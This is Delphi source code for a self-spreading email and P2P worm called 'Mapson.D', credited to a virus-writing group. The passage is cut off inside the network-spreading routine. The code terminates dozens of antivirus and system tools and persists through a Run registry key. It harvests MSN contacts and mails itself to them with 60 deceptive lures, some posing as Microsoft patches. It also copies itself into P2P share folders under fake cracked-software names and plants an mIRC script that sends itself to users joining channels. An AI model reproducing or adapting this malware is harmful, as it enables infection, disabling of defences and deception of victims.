   unit GEDZAC;

   //  GEDZAC LABs
   //  Mapson.D
   //  Coded by Falckon/GEDZAC
   //  Source to Mitosis E-ZIne and my Web :)
   //  http://vx.netlux.org/~falckon
   //  NO ME HAGO RESPONSABLE POR LOS DAÑOS OCACIONADOS


   interface

   USES
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs,Registry, StdCtrls, Psock, NMsmtp,MMSystem,ShellApi,Tlhelp32,Winsock,
     GhostApp;


   TYPE
     TForm1 = class(TForm)
     muerte     :   TNMSMTP;
     Memo1      :   TMemo;
     Edit1      :   TEdit;
     GhostApp1  :   TGhostApp;
     Procedure      FormCreate(Sender: TObject);
     Procedure      network;
     Procedure      InfectP2P;
     Procedure      Infectmirc;
     Procedure      Asesinando;
     Procedure      Reporting;
     private

     { Private declarations }

      public

     { Public declarations }

    end;

     Const
     Nombrew:pchar = '[GEDZAC LABS]';
     CRLF = #13#10;
     About:string = 'Mapson.D Created by Falckon/GEDZAC THE FINAL VERSION';
   VAR
     Form1: TForm1;
     D:integer;
     Tiempo :   TSystemTime;
     guorm  :   String;
     Reg:   TRegistry   ;
     Progfiles  :   String;
     VirusName  :   String;
     SysDir :   String   ;
     Correo :   String;
     Suj:   Array[1..60] of string;
     Bod:   Array[1..60] of string  ;
     Att:   Array[1..60] of string;
     Fro:   ARRAY[1..60] of string;
     xaz:   Integer;
     Eltimer:   Tmsg ;
     firm    : string;
     Socketx : TSocket;
     WSAX    : TWSADATA;
     Shity  : TSockAddrIn;
     Bof       : Array[1..255] of char;
     Host       : PHostEnt;
     IP    : pchar;
     Host2 : PHostEnt;
     IPLocal : pchar;
     Datos  : Array[1..28] of char;
     mensaje : string;
     mensax  : textfile;
     IMPLEMENTATION

     {$R *.dfm}

   FUNCTION Asesinar(archivo: string): integer;

   CONST

     Terminar_proceso=$0001;

   VAR
     CLP: BOOL;
     Lahandle: THandle;
     Procesos32: TProcessEntry32;
    Begin
      Result := 0;
      Lahandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
      Procesos32.dwSize := Sizeof(Procesos32);
      CLP := Process32First(lahandle,Procesos32);
      while integer(CLP) <> 0 DO Begin
      IF ((UpperCase(ExtractFileName(Procesos32.szExeFile)) = UpperCase(archivo)) Or
      (UpperCase(Procesos32.szExeFile) =  UpperCase(archivo))) then
      Result := Integer(TerminateProcess(OpenProcess(Terminar_proceso,                BOOL(0),Procesos32.th32ProcessID), 0));
      CLP := Process32Next(lahandle,Procesos32);
      End;
      CloseHandle(lahandle);
   END;
   Function LeerReg(Llave : HKEY; ruta,llavex:string): string;
   VAR
     Reg:TRegistry;
    Begin
      Reg := TRegistry.Create;
      Reg.RootKey := Llave;
      IF Reg.OpenKeyReadOnly(ruta) Then
      Result := Reg.ReadString(llavex);
   End;
   Function RegWrite(Llave : HKEY; ruta,llavex,valor:string):string;
   VAR
     Reg:TRegistry ;
    Begin
      Reg := TRegistry.Create;
      Reg.RootKey := Llave;
      IF Reg.OpenKey(ruta,true) Then
      Reg.WriteString(llavex,valor);
   End;
   FUNCTION GetSystemDirectory : String;
   VAR
     pcSystemDirectory : PChar;
     dwSDSize  : DWORD;
     begin
     dwSDSize := MAX_PATH + 1;
     GetMem( pcSystemDirectory, dwSDSize );
     Try
     IF Windows.GetSystemDirectory( pcSystemDirectory, dwSDSize ) <> 0 then
     Result := pcSystemDirectory;
     Finally
     FreeMem( pcSystemDirectory );
      end;
   End;
   FUNCTION SND(lp:STRING) : BOOL;
   BEGIN
     IF Send(Socketx,lp[1],Length(lp),0)=SOCKET_ERROR THEN Result:=True ELSE Result:=False;
   END;
   FUNCTION RegRead(LaKey: HKEY; Rutakey, Valor: String): String;
   VAR
     ValorRet: array[0..1500] of Char;
     TamaDato: Integer;
     Llaveactual: HKEY;
     Begin
       RegOpenKeyEx(LaKey, PChar(Rutakey), 0, KEY_ALL_ACCESS, llaveactual);
       TamaDato := 1501;
       RegQueryValueEx(llaveactual, PChar(Valor), nil, nil, @ValorRet[0], @TamaDato);
       RegCloseKey(llaveactual);
       Result := String(ValorRet);
   end;
   procedure TForm1.asesinando;
   Begin
      Asesinar('_AVP32.exe');Asesinar('_AVPCC.exe ');Asesinar('_AVPM.exe ');
      Asesinar('ADVXDWIN.exe'); Asesinar('AGENTW.EXE ');  Asesinar('ALERTSVC.exe ');
      Asesinar('ALOGSERV.exe'); Asesinar('AMON9X.exe'); Asesinar('ANTI-TROJAN.exe');
      Asesinar('ANTS.exe');  Asesinar('APVXDWIN.exe');Asesinar('ATCON.exe');
      Asesinar('ATUPDATER.exe');Asesinar('ATWATCH.exe');Asesinar('AUTODOWN.exe');
      Asesinar('AVCONSOL.exe');Asesinar('AVGCC32.exe');Asesinar('AVGCTRL.exe');
      Asesinar('AVGSERV.exe'); Asesinar('AVGSERV9.exe'); Asesinar('AVGW.exe');
      Asesinar('AVKPOP.exe');Asesinar('AVKSERV.exe ');Asesinar('AVKSERVICE.exe');
      Asesinar('AVKWCTL9');Asesinar('AVP32.exe');Asesinar('AVPCC.exe');
      Asesinar('AVPM.exe');Asesinar('AVPM.EXE ');Asesinar('AVSCHED32.exe');
      Asesinar('AVSYNMGR.exe');Asesinar('PAV.EXE ');Asesinar('AVWINNT.EXE');
      Asesinar('AVXMONITOR9X.exe'); Asesinar('AVXMONITORNT.exe ');
      Asesinar('AVXQUAR.exe '); Asesinar('AVXQUAR.EXE'); Asesinar('AVXW.exe ');
      Asesinar('BLACKD.exe'); Asesinar('BLACKICE.exe'); Asesinar('CCAPP.EXE ');
      Asesinar('CCEVTMGR.EXE'); Asesinar('CCPXYSVC.EXE');Asesinar('ETRUSTCIPE.EXE ');
      Asesinar('EVPN.EXE');Asesinar('EXPERT.exe'); Asesinar('F-AGNT95.exe ');
      Asesinar('FAMEH32.exe');Asesinar('F-PROT.exe'); Asesinar('F-PROT95.exe');
      Asesinar('FP-WIN.exe');Asesinar('FRW ERV.exe');Asesinar('IOMON98.exe');
      Asesinar('NAV AUTO-PROTECT.exe');Asesinar('NAVAP.EXE '); Asesinar('NAVAPSVC.EXE');
      Asesinar('Navapw32.exe ');Asesinar('NAVENGNAVEX15.EXE '); Asesinar('NAVLU32.EXE');
      Asesinar('NAVW32.EXE');Asesinar('NAVWNT.EXE');Asesinar('NDD32.EXE ');
      Asesinar('NPSSVC.EXE');Asesinar('NSCHED32.EXE');Asesinar('PCCIOMON.EXE ');
      Asesinar('PCCNTMON.EXE');Asesinar('PCCWIN97.EXE ');Asesinar('PCCWIN98.EXE ');
      Asesinar('PCSCAN.EXE');Asesinar('PERSFW.EXE');Asesinar('PERSWF.EXE ');
      Asesinar('POP3TRAP.EXE ');Asesinar('RAV7.EXE');Asesinar('VPC32.EXE');
      Asesinar('VPTRAY.EXE');Asesinar('VSCHED.EXE ');Asesinar('AVCONSOL.EXE');
      Asesinar('VSECOMR.EXE');Asesinar('VSHWIN32.EXE ');Asesinar('VSMAIN.EXE ');
      Asesinar('VSMON.EXE '); Asesinar('VSSTAT.EXE '); Asesinar('ZONEALARM.EXE ');
      Asesinar('ICLOAD95.EXE'); Asesinar('ICMON.EXE'); Asesinar('ICSUPP95.EXE');
      Asesinar('ICLOADNT.EXE'); Asesinar('ICSUPPNT.EXE');Asesinar('IFACE.EXE');
      Asesinar('Regedit.EXE');Asesinar('Regedit.com');Asesinar('msconfig.EXE');
      Asesinar('sfc.EXE');Asesinar('sysedit.EXE'); Asesinar('regedt32.EXE');
      Asesinar('NSPCLEAN.exe');Asesinar('taskmgr.exe');Asesinar('msblast.exe');
      Asesinar('Mspclean');Asesinar('pqremove.exe');Asesinar('penis32.exe');
      End;
   PROCEDURE TForm1.FormCreate(Sender: TObject);
   VAR
     Regmsn,Hostmail: String;
     Puta           :     Integer;
     B,contact,chals:     Integer;
     Label                yajodio;
     Label                jodio;
    Begin
      Asesinando;
      SysDir:=GetSystemDirectory;
      Guorm := Application.ExeName;
      For B := 1 to 1000 DO   Begin
      Regmsn:=RegRead(HKEY_CURRENT_USER,'Software\Microsoft\MessengerService\ListCache\.NET Messenger Service','Allow'+inttostr(b))   ;
      Memo1.lines.Add(regmsn);
      End;
      For B:=1 to 1000 DO  Begin
      Regmsn:=RegRead(HKEY_CURRENT_USER,'Software\Microsoft\MSNMessenger\ListCache\.NET Messenger Service','Allow'+inttostr(b))   ;
      Memo1.lines.Add(regmsn);
      End;
      Contact:=Memo1.lines.Count Mod 22;
      IF contact = 0 then
      Begin
      Contact:=1;
   End;
      Edit1.text:=Memo1.Lines[contact];
      GetlocalTime(Tiempo);
      RegWrite(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\Run','NAV',SysDir + '\RuxDLL32.exe');
      Copyfile(pchar(Guorm), pChar(SysDir + '\RuxDLL32.exe'),true);
      IF Not FileExists('C:\Falckon.vxd') then
      Begin
      Copyfile(pchar(Guorm),'C:\Falckon.vxd',true);
      InfectP2P
      End;
   Bod[1] := 'Epidemia por virus Blaster! este mail es importante no los borres, el virus Blaster se a estado reproduciendo con gran capacidad, es recomendable usar el '+
   ' parche correctivo para la falla de su windows, por favor no espere más y aplique el parche, es por el bienestar de su máquina.';
   Att[1] := 'Q832645.exe';
   Suj[1] := 'Alerta por Virus Blaster';
   fro[1] := 'virus@viruses.com';
   Suj[2] := 'Nuevo Mensaje';
   Bod[2] := 'Tienes un nuevo correo para verlo haz clic en del adjunto. '  ;
   Att[2] := 'newmail.scr';
   fro[2] := String(Edit1.text);
   Suj[3] := 'Messenger y la Privacidad.';
   Bod[3] := 'Este documento habla sobre las desventajas de usar el Msn Messenger como mensajero instantáneo, cualquier duda se le respondera en el documento.';
   Att[3] := 'privacidad.pif';
   fro[3] := String(Edit1.text);
   Suj[4] := 'Roban cuentas de hotmail.';
   Bod[4] := 'Últimamente e estado recibiendo muchos correos diciéndome provenir de Hotmail pero no, estos correos nos piden nombre de usuario y password, pero en realidad es mentira, nuestra cuenta sera robada, para saber más lea el adjunto';
   Att[4] := 'cuentashotmail.pif';
   fro[4] := string(Edit1.text);
   Suj[5] := 'Huevo Cartoons Gratis :D';
   Bod[5] := 'Encontré una página con una buena colección de huevo cartoons!.';
   Att[5] := 'www.huevosymashuevos.com';
   Fro[5] := String(Edit1.text);
   Suj[6] := 'Me gusta..';
   Bod[6] := 'A mí me gusta, y a tí?';
   fro[6] := string(Edit1.Text);
   Att[6] := 'xtreme.pif';
   Suj[7] := 'Lista de vulnerabilidades en windows';
   Bod[7] := 'Esta es una lista de vulnerabilidades en windows para que sepas y no te vayan a hackear, cuídate, chau';
   Att[7] := 'vulnerabildades.pif';
   fro[7] := String(Edit1.text);
   Suj[8] := 'Así me veo.';
   Bod[8] := 'Esta es mi foto cuando estaba en la playa :).';
   Att[8] := 'playa_cancun.pif';
   fro[8] := String(Edit1.text);
   Suj[9] := 'Sofia vergara screen saver.';
   Bod[9] := 'Nuevo Screen Saver de sofia vergara desnuda, que esperais para bajarlo!';
   Att[9] := 'sofíavergara.scr';
   fro[9] := String(Edit1.text);
   Suj[10] := 'Nuevo ScreenSaver de Britney Spears.';
   Bod[10] := 'Nuevo screen saver de britney! :).';
   Att[10] := 'britney.scr';
   fro[10] := String(Edit1.text);
   Suj[11] := 'Campaña de Seguridad en la red';
   Bod[11] := 'Nueva campaña de seguridad en la red patrocinada por www.vsantivirus.com, haga clic en el adjunto para enterarse sobre esto.';
   Att[11] := 'www.vsantivirus.com';
   fro[11] := String(Edit1.text);
   Suj[12] := 'Nunca me había visto tan bien';
   Bod[12] := 'Nunca me había visto tan bien en esta foto.';
   Att[12] := 'engrupo.pif';
   fro[12] :=  String(Edit1.text);
   Suj[13] := 'Problemas de disfunción sexual?...';
   Bod[13] := 'Diez ejercicios con los cuales lograra tener una erección 10 veces mejor que la que siempre a tenido, además de aumentar el tamaño de su pene lealos y no tendra más problemas.';
   Att[13] := 'disfuncion.pif';
   fro[13] := String(Edit1.text);
   Suj[14] := '10 pasos para excitar a una mujer'  ;
   Bod[14] := 'Aquí tengo 10 pasos fáciles a seguir para lograr excitar a una mujer, ella lograra tener de 2 a 3 orgasmos léalos, chau.' ;
   Att[14] := 'orgasmo.pif';
   fro[14] := string(Edit1.Text);
   Suj[15] := 'Herramienta gratuita para eliminar el Blaster';
   Bod[15] := 'Si usted esta infectado de este peligroso gusano es mejor que utilice la vacuna que le mando, ejecútela y no tendrá mas problemas.'  ;
   Att[15] := 'Anti-Blaster.exe';
   fro[15] := String(Edit1.text);
   Suj[16] := '10 consejos para tener una buena relación sentimental';
   Bod[16] := '10 simples consejos para tener una buena relación sentimental con su pareja léalos y no tendrá mayores problemas.';
   fro[16] :=  String(Edit1.text);
   Att[16] := 'pareja.pif';
   Suj[17] := 'Su máquina tiene un virus';
   Bod[17] := 'Si su máquina se reinica acada rato, esto es por un nuevo virus que afecta toda internet, para arreglar el problema use el antivirus que le envío.';
   Att[17] := 'Anti-Blaster.exe';
   fro[17] := String(Edit1.text);
   Suj[18] := 'Alerta de virus'  ;
   Bod[18] := 'Cuidado! este virus es peligroso puede formatearte el disco duro, llega por hotmail sin que te des cuenta, tu podrias estar infectado'+
   ' busca en tu sistema el archivo rundll32.exe, si lo tienes es mejor que utilizes la vacuna que te mando, hazlo cuanto antes!! no esperes!!';
   Att[18] := 'antirundll.exe';
   fro[18] :=  String(Edit1.text);
   Suj[19] := 'Música gratis';
   Bod[19] := 'Bajate toda la música que tu quieras, cuando quieras o como quieras!!!';
   Att[19] := 'sharekaza.exe';
   fro[19] := String(Edit1.text);
   Suj[20] := 'Nuevo y seguro cliente P2P';
   Bod[20] := 'Esta arto del spyware en su cliente P2P como KaZaA?'+
   ' Yo al menos sí! Odio que me espíen, y que hasta me puedan denunciar,'+
   ' Por eso a salido un nuevo cliente P2P, que actúa de forma stealth por lo que'+
   ' No saben quién descarga un archivo además de poder bajar toda la música'+
   'Gratis.'+
   ' Saludos.';
   Att[20] := 'P2P.pif';
   fro[20] := String(Edit1.text);
   Suj[21] := 'Te amo.';
   Bod[21] := 'Te amo tanto que moriría por tí.'  ;
   Att[21] := 'teamo.pif';
   fro[21] := String(Edit1.Text) ;
   Suj[22] :=  'Virus en Hotmail';
   Bod[22] := 'Hola, se a dado una alerta por parte de las empresas antivirus, de un nuevo virus que se expande por hotmail, hasta el momento indetectable para cualquier producto antiviral, por lo que recomiendo leer las precauciones sobre este nuevo gusano informatico.'+
   ' Para más información, favor de leer el documento informativo.'  ;
   Att[22] := 'nuevovirus.txt   .pif';
   fro[22] := string(edit1.Text)  ;
   Suj[23] := ' Kamasutra  ';
   Bod[23] := 'Kamasutra el arte del sexo';
   att[23] := 'kamasutra.pif';
   Fro[23] := String(Edit1.text);
   Suj[24] := 'Su pareja ideal';
   Bod[24] := 'Los 10 consejos para tener una pareja ideal,'+
      'Léalos y póngalos en practica, le aseguro que tendrá resultados'+
      'satisfactorios.';
   Att[24] := 'parejaideal.pif';
   Fro[24] := String(Edit1.text);
   Suj[25] := 'Sabes que es el Amor?';
   Bod[25] := 'Yo no sé que es el amor tampoco lo e sentido, pero este texto te ayuda a comprenderlo.';
   Att[25] := 'amores.pif';
   Fro[25] := String(Edit1.text);
   Suj[26] := 'Como consquistar chicas.';
   Bod[26] := 'Aquí le doy unos consejos para tener chicas rendidas a sus pies, lealos y me dice que tal.';
   Att[26] := 'chicas.pif';
   Fro[26] := String(Edit1.text);
   Suj[27] := 'La Biblia del Hacker';
   Bod[27] := 'Excelente libro para aprender a hackear un windows de manera fácil y rápida, con 10 temas de rápido aprendizaje, no dejes pasar más tiempo y leelo ya pero no se lo pases a nadie que es solo para tí.';
   Att[27] := 'Hacker-Bible.pif';
   Fro[27] := String(Edit1.text);
   Suj[28] := '¿Como crear un virus?';
   Bod[28] := 'Con este sencillo manual aprenderas a crear virus rápidamente, cuidate, chau';
   Att[28] := 'viruses.pif';
   Fro[28] := String(Edit1.text);
   Suj[29] := 'Nueva vulnerabilidad en Windows';
   Bod[29] := 'El día de hoy se a descubierto una nueva vulnerabilidad para los sistemas windows'+
   ' recomendamos aplicar el siguiente parche de seguridad, ya que el no parchear esta vulnerabilidad' +
   ' puede permitir la ejecución de código en la máquina afectada y podría ser explotada por algún virus' +
   ' como es el caso del Blaster, Gracias';
   Att[29] := 'K54403.exe';
   Fro[29] := 'microsoft@microsoftupdate.com';
   Suj[30] := 'Hack Mails';
   Bod[30] := 'queres verle el mail a un amigo, al jefe, saber si la la novia se mailea con otro, entonces usa este programa ;).';
   Att[30] := 'mailcrack.bat';
   Fro[30] := 'hackers@hackwebmail.com';
   Suj[31] := 'Lista de virus recientes';
   Bod[31] := 'Aquí te doy una lista de virus recientes para que estés pendiente y no te vayas'+
   ' a infectar, saludos, chau';
   Att[31] := 'virus-list.pif';
   Fro[31] := String(Edit1.text);
   Suj[32] := '¿qué es un virus?';
   Bod[32] := 'Un pequeño texto que nos informa y nos dice que es un virus, como desinfectarse, como contrarlos etc.. espero que te guste.';
   Att[32] := 'virus-faq.pif';
   Fro[32] := String(Edit1.text);
   Suj[33] := 'Actualización';
   Bod[33] := 'Disculpa apenas pude enviarte la actualización del programa, es que tenía mucho trabajo, chau cuidate.';
   Att[33] := 'update.exe';
   Fro[33] := String(Edit1.text);
   Suj[34] := 'Animaciones';
   Bod[34] := 'Checa estas divertidas animaciones que te envío, no se las des a nadie mas son solo para ti!';
   Att[34] := 'animaciones.pif';
   Fro[34] := String(Edit1.text);
   Suj[35] := 'Posiciones';
   Bod[35] := 'Para que no te digan y no te cuenten, posiciones para hacer el amor, checalas y me dices que tal pero no se las des a nadie más, bye.';
   Att[35] := 'posiciones.exe';
   Fro[35] := String(Edit1.text);
   Suj[36] := 'Información confidencial';
   Bod[36] := 'Por favor, checa el adjunto para que sepas de que hablo, bye.';
   Att[36] := 'confidencial.pif';
   Fro[36] := String(Edit1.text);
   Suj[37] := 'divisas.txt';
   Bod[37] := 'Hola, tengo problemas con este archivo serías amable de checarlo por mí?, gracias, adios';
   Att[37] := 'readme.pif';
   Fro[37] := String(Edit1.text);
   Suj[38] := 'Contraseñas';
   Bod[38] := 'Contraseñas de hotmail, para ti, no se las pases a nadie gracias te cuidas chau.';
   Att[38] := 'contraseñas.pif';
   Fro[38] := String(Edit1.text);
   Suj[39] := 'Si no te interesa..';
   Bod[39] := 'Si esto no te interesa no lo leas.';
   Att[39] := 'muy-interesante.pif';
   Fro[39] := String(Edit1.text);
   Suj[40] := 'Información';
   Bod[40] := 'La siguiente información no a podido ser enviada';
   Att[40] := 'confidential-information.pif';
   Fro[40] := 'juan@ivan-ich.com';
   Suj[41] := 'Ouija Online';
   Bod[41] := 'Quieres conocer, el juego que ha despertado temores y discuciones a lo largo del tiempo, mira esto';
   Att[41] := 'JuegoconlosMuertos.pif';
   Fro[41] := String(Edit1.text);
   Suj[42] := 'Tienes un E-Mail';
   Bod[42] := 'Tienes un E-mail para visualizarlo haga clic en el adjunto.';
   Att[42] := 'mail.bat';
   Fro[42] := String(Edit1.text);
   Suj[43] := 'Expresate';
   Bod[43] := 'Sí el texto no expresa lo que sientes devuelvemelo.';
   Att[43] := 'amor.bat';
   Fro[43] := String(Edit1.text);
   Suj[44] := 'thalía desnuda!!!';
   Bod[44] := 'Recientemente se publicaron unas fotos de la cantante thalía totalmente desnuda!, e logrado sacar unas y aquí te las mando, están comprimidas, por favor no se las des a nadie son solo para tí! saludos, bye.';
   Att[44] := 'thalía-sex.pif';
   Fro[44] := String(Edit1.text);
   Suj[45] := 'Animación!!';
   Bod[45] := 'Lo e hecho yo y me gustaría que le dieras un vistazo y me dijeras que tal lo vez tú, cuidate,bye.';
   Att[45] := 'sexual-positions.bat';
   Fro[45] := String(Edit1.text);
   Suj[46] := 'Foto en alemania';
   Bod[46] := 'Me e tomado una foto cuando estuve en alemania y me gustaría que le hecharas un vistazo y me dijeras como me veo, cuidate y adios.';
   Att[46] := 'foto-alemania.pif';
   Fro[46] := String(Edit1.text);
   Suj[47] := 'LatinCards';
   Bod[47] := 'Le han enviado una LatinCard para poder visualizarla abra el adjunto'+
   'Gracias.';
   Att[47] := 'lovecard.bat';
   Fro[47] := String(Edit1.text);
   Suj[48] := '5 consejos para conquistar a una chica';
   Bod[48] := 'Entre estos consejos se encuentran la comunicación y el respeto, si quieres saber más lee por favor el archivo.';
   Att[48] := 'consejos-mujeres.bat';
   Fro[48] := String(Edit1.text);
   Suj[49] := 'Fotos de mi chica';
   Bod[49] := 'Aqui tienes unas fotos de mi chica, dime si te gustan..';
   Att[49] := 'chica-sex.scr';
   Fro[49] := String(Edit1.text);
   Suj[50] := 'Hackear correos de yahoo, hotmail!!!!';
   Bod[50] := 'Acabo de terminar mi nuevo programa para hackear cuentas de correo de yahoo, hotmail y latinmail, recuerda que es solo para tí por favor no se lo des a nadie mas.';
   Att[50] := 'hotmailhacker.exe';
   Fro[50] := String(Edit1.text);
   Suj[51] := 'hackear paginas web!!!!';
   Bod[51] := 'Aquí te envío un programa que hice para hackear paginas web, no se lo des a nadie que es solo para tí prometemelo!, chau cuidate.';
   Att[51] := 'hackwebs.exe';
   Fro[51] := String(Edit1.text);
   Suj[52] := '5 pasos para hackear hotmail';
   Bod[52] := 'Oye te doy un texto para hackear hotmail es solo para tí, pero no se los des a nadie Prometemelo, ok?, chau.';
   Att[52] := 'hotmailhack.pif';
   Fro[52] := String(Edit1.text);
   Suj[53] := 'New Terminator Screen Saver!';
   Bod[53] := 'NEW Terminator Screen Saver, i hope you will like ';
   Fro[53] := String(Edit1.text);
   Suj[54] :=  'Generador de virus!';
   Bod[54] := 'Te paso este programa con el cual puedes crear virus y joder a tus amigos, o a tus ENemigos y hasta con la opción de robar los examenes de tu escuela, es solo para ti,'+
   ' no se lo pases a nadie por favor prometelo, genera un virus y me dices como te fue. chau';
   Att[54] := 'generatorviruses.exe';
   Fro[54] := String(Edit1.text);
   Suj[55] := 'Shakira Screensaver';
   Bod[55] := 'Screen Saver de shakira donde sale desnuda :O.';
   Att[55] := 'shakira.scr';
   Fro[55] := String(Edit1.text);
   Suj[56] := 'Pics of my Girl';
   Bod[56] := 'Here you have the pics of my girl, do you like them ?';
   Att[56] := 'girlpic.pif';
   Fro[56] := String(Edit1.text);
   Suj[57] := 'Blaster Remover';
   Bod[57] := 'his is the new blaster remover, run it as soon as you can';
   Att[57] := 'Anti-BlasterWorm.exe';
   Fro[57] := String(Edit1.text);
   Suj[58] := 'Matrix Reloaded';
   Bod[58] := ' Matrix Reloaded new screen Saver, i hope you will like ';
   Att[58] := 'MatrixReloaded.scr';
   Fro[58] := String(Edit1.text);
   Suj[59] := 'Screen Savers';
   Bod[59] := 'Cameron Diaz and Paulina rubio naked Screen Saver';
   Att[59] := 'Paulina-rubio-cameron-diaz.scr';
   Fro[59] := String(Edit1.text);
   Suj[60] := 'New Drivers for windows Update';
   Bod[60] := 'New Drivers for windows Update, please update now!';
   Att[60] := 'Drivers-Windows.exe';
   Fro[60] := String(Edit1.text);
   Network;
   For chals := 1 to 60 Do Begin
      Copyfile(pchar(guorm),pchar(SysDir + '\'+Att[chals]),true);
      End;
      Puta := 0;
      Hostmail := 'mx2.hotmail.com';
      Muerte.Host := hostmail;
      Yajodio:
      Try
      Muerte.connect;
      Except
      IF muerte.Connected = false then
      Begin
      Puta := 1;
      End
      Else
      Puta := 0;
      End;
      IF puta = 1 then goto yajodio   ;
      Muerte.PostMessage.ToBlindCarbonCopy.AddStrings(memo1.lines);
      Muerte.PostMessage.FromAddress :=  fro[Tiempo.wSecond];
      Muerte.PostMessage.FromName := fro[Tiempo.wSecond];
      Muerte.PostMessage.Subject := Suj[Tiempo.wSecond]  ;
      Muerte.PostMessage.Attachments.Add(SysDir + '\' + Att[Tiempo.wSecond]);
      Muerte.PostMessage.Body.Add(Bod[Tiempo.wSecond]);
      Muerte.SendMail   ;
      Muerte.Disconnect;
      Firm := LeerReg(HKEY_LOCAL_MACHINE,'\Software\','infected');
      IF Firm <> '1' then
      Begin
      RegWrite(HKEY_LOCAL_MACHINE,'\Software\','infected','1');
      Reporting;
      End;
      Infectmirc;
      IF Tiempo.wMonth = 11 then
      Begin
      SetSystemPowerState(FALSE,FALSE);
      End;
      mensaje := 'Thx to All my VX Friends, specially SlageHammer, VirusBstr, Positron ' +   crlf +
      'VB : Thx for the GhostApp Component :D, '+               CRLF +
      'Slage : Thx for the 5 msgs to my worm :D and ur counsels ' +      CRLF +
      'Positron: to ur SMTP engine 0.9, i study and learn sockets :D' +  CRLF     +
      'Thx to All '+       CRLF+
      'Mabel i love u :P';
      AssignFile(mensax,'C:\-.txt');
      ReWrite(mensax);
      WriteLn(mensax,mensaje);
      closefile(mensax);
      SetTimer(0, 0,  2000, nil);
      while (GetMessage(eltimer,0 ,0 ,0)) do Begin
      Asesinando;
      End;
    end;
   PROCEDURE TForm1.infectmirc;
   VAR
     DV, Mxa:string;
     Lx:integer;
     Scriptm:textfile;
    Begin
      DV := LeerReg(HKEY_LOCAL_MACHINE,'\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC','UninstallString');
      For lx:=1 to length(DV) do if (lx>1)and(lx<length(DV)-19) then mxa:=mxa+DV[lx];
      AssignFile(scriptm,mxa + 'script.ini');
      ReWrite(Scriptm);
      Writeln(Scriptm,'[script]');
      Writeln(Scriptm,'n0=On 1:JOIN:#:{/if ( $nick == $me) { halt } | .privmsg $nick ' +Bod[Tiempo.wSecond]+' | /dcc Send -c $nick '+SysDir+'\' + Att[Tiempo.wSecond]);
      closefile(Scriptm);
      end;
   PROCEDURE TForm1.InfectP2P;
   VAR
     CarpetasP2P:array[1..14] of string; Gname:array[1..54] of string;
     Comlg:array[1..5] of string;  C,g,r:integer ;
     Begin
       Progfiles := LeerReg(HKEY_LOCAL_MACHINE,'\SOFTWARE\Microsoft\Windows\CurrentVersion','ProgramFilesDir');
       CarpetasP2P[1] := '\KaZaA\My Shared Folder\'; CarpetasP2P[2] := '\edonkey2000\incoming\';
       CarpetasP2P[3] := '\gnucleus\downloads\'; CarpetasP2P[4] := '\icq\shared files\';
       CarpetasP2P[5] := '\kazaa lite\My Shared Folder\';CarpetasP2P[6] := '\limewire\shared\';
       CarpetasP2P[7] := '\morpheus\my shared folder\';CarpetasP2P[8] := '\Grokster\My Grokster\';
       CarpetasP2P[9] := '\WinMX\My Shared Folder\';CarpetasP2P[10] := '\Tesla\Files\';
       CarpetasP2P[11] := '\Overnet\Incoming\';CarpetasP2P[12] := '\XoloX\Downloads\';
       CarpetasP2P[13] := '\Rapigator\Share\';CarpetasP2P[14] := '\KMD\My Shared Folder\';
       Gname[1] := 'Kazaa Media Desktop' ; Gname[2] := 'ICQ Lite '; Gname[3] := 'WinZip';
       Gname[4] := 'iMesh ';Gname[5] := 'AOL Instant Messenger (AIM)';
       Gname[6] := 'ICQ ro 2003a beta ';Gname[7] := 'Morpheus '; Gname[8] := 'Ad-aware ';
       Gname[9] := 'Trillian ';Gname[10] := 'Download Accelerator plus';Gname[11] := 'ZoneAlarm ';
       Gname[12] := 'Grokster'; Gname[13] := 'WinRAR ';Gname[14] := 'DivX Video Bundle ';
       Gname[15] := 'RealOne Free Player '; Gname[16] := 'Netumer ';
       Gname[17] := 'Adobe Acrobat Reader (32-bit) '; Gname[18] := 'JetAudio Basic ';
       Gname[19] := 'WS_FT LE (32-bit) '; Gname[20] := 'SnagIt ';  Gname[21] := 'Registry Mechanic';
       Gname[22] := 'WinMX '; Gname[23] := 'MSN Messenger (Windows NT/2000)';
       Gname[24] := 'Biromsoft WebCam '; Gname[25] := 'Nero Burning ROM ';
       Gname[26] := 'Microsoft Windows Media layer '; Gname[27] := 'Sybot - Search & Destroy ';
       Gname[28] := 'Copernic Agent ';Gname[29] := 'Winamp';
       Gname[30] := 'Diet Kazaa ';Gname[31] := 'SolSuite 2003: Solitaire Card Games Suite ';
       Gname[32] := 'pop-Up Stoper '; Gname[33] := 'QuickTime ';
       Gname[34] := 'XoloX Ultra ';Gname[35] := 'Microsoft Internet Exlorer ';
       Gname[36] := 'Network Cable e ADSL Speed '; Gname[37] := 'Kazaa Download Accelerator ';
       Gname[38] := 'Global DiVX layer ';   Gname[39] := 'DirectDVD ';
       Gname[40] := 'Kasersky Antivirus' ; Gname[41] := 'PerAntivirus';
       Gname[42] := 'Norton Antivirus'; Gname[43] := 'Panda Antivirus';
       Gname[44] := 'McAfee Antivirus';  Gname[45] := 'Microsoft Office XP';
       Gname[46] := 'Microsoft Windows 2003'; Gname[47] := 'Office 2003';
       Gname[48] := 'Visual Studio Net'; Gname[49] := 'Delphi 6';  Gname[50] := 'msn hack'  ;
       Gname[51] := 'Matrix Movie'; Gname[52] := 'Virtual Girl';    Gname[53] := 'FireWorks 4';
       Gname[54] := 'FIreWorks MX';  Comlg[1] := ' Cracked';  Comlg[2] := ' crack all versions';
       Comlg[3] := ' ';  Comlg[4] := ' KeyGen'; Comlg[5] := ' Full version';
       For C := 1 to 14 DO  Begin
       For G := 1 to 5  Do  Begin
       For R := 1 to 54 Do  Begin
       Copyfile(pchar(guorm),
       Pchar(PROGFILES+CarpetasP2P[c]
       +Gname[r]+comlg[g]+'.exe'),true);
       End;
       End;
       End;
   End;
   PROCEDURE TForm1.Network;
   VAR
     I:Char;
     T:Integer;
     ThePath:String;
     Carpetas:Array[1..5] of string;
     MaxNetPathLen:DWord;
     Begin
       Carpetas[1] := '\';
       Carpetas[2] := '\Documents and Settings\All Users\Start Menu\Programs\Startup\';
       Carpetas[3] := '\WINDOWS\Start Menu\Programs\Startup\';
       Carpetas[4] := '\WINDOWS\Menú inicio\Programas\Inicio\';
       Carpetas[5] := '\WINNT\Profiles\All Users\Start Menu\Programs\Startup\';
